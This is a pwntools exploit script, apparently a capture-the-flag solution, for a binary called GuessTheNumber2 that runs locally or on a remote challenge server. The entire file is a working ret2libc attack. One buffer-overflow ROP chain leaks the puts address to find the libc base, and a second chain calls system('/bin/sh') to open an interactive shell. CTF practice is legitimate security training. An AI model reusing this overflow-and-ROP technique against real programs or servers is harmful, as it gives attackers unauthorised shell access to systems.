from sys import getallocatedblocks
from pwnlib import gdb
from ctypes import addressof
from pwn import *

elf = ELF("./GuessTheNumber2")

if args.REMOTE:
    r = remote("gtn2.challs.olicyber.it", 10023)
    libc = ELF("./libc6_2.35-0ubuntu3.10_amd64.so")
    libc.address = 0
else:
    r = process("./GuessTheNumber2")
    libc = elf.libc
    gdb.attach(r, gdbscript="""
        b *0x00000000004016C8
        c
    """)

ret = 0x000000000040101a
pop_rdi = 0x0000000000401803
puts_plt = elf.plt["puts"]
puts_got = elf.got["puts"]

payload = flat(
    b"\x00"*36,
    p64(pop_rdi),
    p64(puts_got),
    p64(puts_plt),
    p64(elf.symbols["main"])
)

r.sendline(payload)
r.sendline(b"0")

r.recvuntil(b"No high scores yet :(\n")
libc_base = libc.address = u64(r.recvline().strip().ljust(8, b"\x00")) - libc.symbols["puts"]
print(f"Libc base: {hex(libc_base)}")

payload = flat(
    b"\x00"*36,
    p64(pop_rdi),
    p64(next(libc.search(b"/bin/sh\x00"))),
    p64(ret),
    p64(libc.symbols["system"])
)

r.sendline(payload)
r.sendline(b"0")

r.interactive()